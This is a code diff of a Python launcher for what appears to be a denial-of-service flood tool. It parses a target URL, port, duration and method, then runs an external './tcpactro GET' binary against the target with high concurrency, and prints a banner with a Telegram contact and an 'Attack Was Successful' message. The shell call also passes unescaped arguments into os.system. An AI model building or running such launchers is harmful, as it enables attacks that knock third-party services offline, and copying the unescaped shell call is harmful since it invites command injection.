@@ -71,6 +71,7 @@ def main(url, port, time, methods):
     print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTELE   : [ \x1b[38;2;0;255;255mt.me/iRazzGans \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2:233;233;233mSENT   : [ \x1b[21mAttack Was Successful And Has Been Completed \x1b[38;2;233;233;233]")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
@@ -79,8 +80,11 @@ if __name__ == "__main__":
     parser.add_argument('time', type=int, help='Time duration of attack')
     parser.add_argument('methods', type=str, help='Methods used')
     
+    # Parse arguments
     args = parser.parse_args()
 
-    os.system(f'python3 noss.py {url} {port} {time} {methods}')
+    # Ensure the os.system call is after args is defined
+    os.system(f'./tcpactro GET {args.url} {args.port} {args.time} 8500')
 
+    # Call the main function with the parsed arguments
     main(args.url, args.port, args.time, args.methods)
